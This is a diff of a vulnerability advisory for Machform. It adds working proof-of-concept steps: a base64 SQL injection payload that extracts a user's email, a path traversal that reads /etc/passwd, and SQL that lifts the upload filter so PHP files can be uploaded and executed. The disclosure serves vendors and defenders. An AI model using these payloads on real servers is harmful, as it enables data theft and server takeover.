@@ -35,8 +35,8 @@ Otherwise the arbitrary file upload can let an attacker get control of the serve
 ## SQL injection
 The software is subject to SQL injections in the **'download.php'** file. This SQLi can be found on the parameter **'q'** which a *base64* encoded value for the following parameters:
 ```php
-$form_id 	= $params['form_id'];
-$id      	= $params['id'];
+$form_id    = $params['form_id'];
+$id         = $params['id'];
 $field_name = $params['el'];
 $file_hash  = $params['hash'];
 ```
@@ -46,18 +46,50 @@ This is due to the following vulnerable statement:
 $query 	= "select {$field_name} from `".MF_TABLE_PREFIX."form_{$form_id}` where id=?";
 ```
 
-## POC
+### POC
 
 Proof of concept to get the first user mail:
 ```
   http:// [URL] / [Machform_folder] /download.php?q=ZWw9IChTRUxFQ1QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHgyMDIwLChTRUxFQ1QgTUlEKCh1c2VyX2VtYWlsKSwxLDUwKSBGUk9NIGFwX3VzZXJzIE9SREVSIEJZIHVzZXJfaWQgTElNSVQgMCwxKSwweDIwMjAsRkxPT1IoUkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLkNIQVJBQ1RFUl9TRVRTIEdST1VQIEJZIHgpYSkgOyZpZD0xJmhhc2g9MSZmb3JtX2lkPTE=
 ```
-which is the *base64* encoding for:
-```
+Which is the *base64* encoding for:
+```sql
 el= (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x2020,(SELECT MID((user_email),1,50) FROM ap_users ORDER BY user_id LIMIT 0,1),0x2020,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) ;&id=1&hash=1&form_id=1
 ```
 
+## Path traversal
 
+**'download.php'** is used to serve stored files from the forms answers. Modifying the name of the file to serve on the corresponding **ap_form** table leads to a path traversal vulnerability.
 
+### POC
+First, we need to change the name for the element on the form:
+```sql
+update ap_form_58009 set element_4="../../../../../../../../../../../../../../../../etc/passwd" where id=1;
+```
+Now in order to be able to download it, we need to access:
+```
+ http:// [URL] / [Machform_folder] /download.php?q=ZWw9NCZpZD0xJmhhc2g9NDAyYmEwMjMwZDZmNDRhMmRlNTkwYWMxMTEwN2E0NTgmZm9ybV9pZD01ODAwOQo=
+```
+Which is the *base64* encoding for:
+```
+ el=4&id=1&hash=402ba0230d6f44a2de590ac11107a458&form_id=58009
+```
+Note that hash is the MD5 of the corresponding filename:
+`md5("../../../../../../../../../../../../../../../../etc/passwd")=402ba0230d6f44a2de590ac11107a458`
 
+## Bypass file upload filter
 
+When the form is set to filter a blacklist, it automatically adds dangerous extensions to the filters. 
+If the filter is set to a whitelist, the dangerous extensions can be bypassed.
+
+This can be done directly on the database via SQLi 
+```sql
+update ap_form_elements set element_file_type_list="php",element_file_block_or_allow="a" where form_id=58009 and element_id=4;
+```
+Once uploaded the file can be found and executed in the following URL:
+`http:// [URL] / [Machform_folder] /data/form_58009/files/ [filename]`
+
+The filename can be found in the database
+```sql
+SELECT element_4 FROM ap_form_58009 WHERE id=1;
+```
